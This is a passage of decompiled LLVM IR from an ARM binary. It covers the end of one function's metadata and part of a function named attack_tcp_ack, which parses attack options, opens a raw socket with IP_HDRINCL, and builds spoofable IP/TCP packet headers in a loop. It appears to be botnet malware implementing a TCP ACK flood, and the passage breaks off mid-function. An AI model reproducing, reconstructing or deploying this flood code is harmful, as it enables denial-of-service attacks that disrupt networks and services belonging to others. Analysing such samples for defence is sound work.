  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v5_a520, { 1, 0 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
  uselistorder i32 %v0_a49c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v6_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v5_a8bc = sdiv i32 %sext, 16777216
  %v6_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v7_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v6_a8bc, i32 3, i32 65535, i32 %v5_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v5_a918 = inttoptr i32 %v0_a90c to i32*
  %v6_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v5_a918, i32 6, i32 65535, i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v5_a934 = inttoptr i32 %v0_a920 to i32*
  %v6_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v5_a934, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v5_a950 = inttoptr i32 %v0_a93c to i32*
  %v6_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v5_a950, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a96c = inttoptr i32 %v0_a95c to i32*
  %v6_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a96c, i32 18, i32 65535, i32 %v6_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v6_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v6_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v5_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v5_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v2_abf8 = load i32, i32* @r5, align 4
  %v3_abf8 = add i32 %v2_abf8, 9
  %v4_abf8 = inttoptr i32 %v3_abf8 to i8*
  store i8 %v1_abf8, i8* %v4_abf8, align 1
  store i32 %v6_aa50, i32* %ip.global-to-local, align 4
  %v1_ac00 = load i32, i32* @r5, align 4
  %v2_ac00 = add i32 %v1_ac00, 12
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v6_aa50, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r3.global-to-local, align 4
  %v0_ac08 = load i32, i32* @sb, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r5, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @fp, align 4
  %v1_ac0c = trunc i32 %v0_ac0c to i16
  %v2_ac0c = load i32, i32* @r5, align 4
  %v3_ac0c = add i32 %v2_ac0c, 4
  %v4_ac0c = inttoptr i32 %v3_ac0c to i16*
  store i16 %v1_ac0c, i16* %v4_ac0c, align 2
  %v0_ac10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac10 = load i32, i32* @r5, align 4
  %v2_ac10 = add i32 %v1_ac10, 16
  %v3_ac10 = inttoptr i32 %v2_ac10 to i32*
  store i32 %v0_ac10, i32* %v3_ac10, align 4
  %v0_ac14 = load i32, i32* @r6, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i16
  %v2_ac14 = load i32, i32* @r5, align 4
  %v3_ac14 = add i32 %v2_ac14, 20
  %v4_ac14 = inttoptr i32 %v3_ac14 to i16*
  store i16 %v1_ac14, i16* %v4_ac14, align 2
  %v0_ac18 = load i32, i32* @r5, align 4
  %v1_ac18 = add i32 %v0_ac18, 20
  store i32 %v1_ac18, i32* @r4, align 4
  %v1_ac1c = add i32 %v0_ac18, 32
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %v4_ac1c = zext i8 %v3_ac1c to i32
  store i32 %v4_ac1c, i32* %r3.global-to-local, align 4
  %v1_ac20 = add i32 %v0_ac18, 33
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab28, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_ac1c, 16
  %v1_ac28 = zext i8 %tmp76 to i32
  %v1_ac2c = or i32 %v1_ac28, 80
  store i32 %v1_ac2c, i32* %r3.global-to-local, align 4
  %v1_ac30 = and i32 %v4_ac20, 223
  store i32 %v1_ac30, i32* %r2.global-to-local, align 4
  %v1_ac34 = trunc i32 %v1_ac2c to i8
  store i8 %v1_ac34, i8* %v2_ac1c, align 1
  %v0_ac38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac38 = load i32, i32* %r0.global-to-local, align 4
  %v4_ac38 = mul i32 %v1_ac38, 32
  %v5_ac38 = or i32 %v4_ac38, %v0_ac38
  store i32 %v5_ac38, i32* %r2.global-to-local, align 4
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ac40 = trunc i32 %v5_ac38 to i8
  %v2_ac40 = load i32, i32* @r4, align 4
  %v3_ac40 = add i32 %v2_ac40, 13
  %v4_ac40 = inttoptr i32 %v3_ac40 to i8*
  store i8 %v1_ac40, i8* %v4_ac40, align 1
  %v0_ac44 = load i32, i32* @r4, align 4
  %v1_ac44 = add i32 %v0_ac44, 13
  %v2_ac44 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac44 = load i8, i8* %v2_ac44, align 1
  %v4_ac44 = zext i8 %v3_ac44 to i32
  store i32 %v1_ab2c, i32* %r2.global-to-local, align 4
  %v1_ac4c = and i32 %v4_ac44, 239
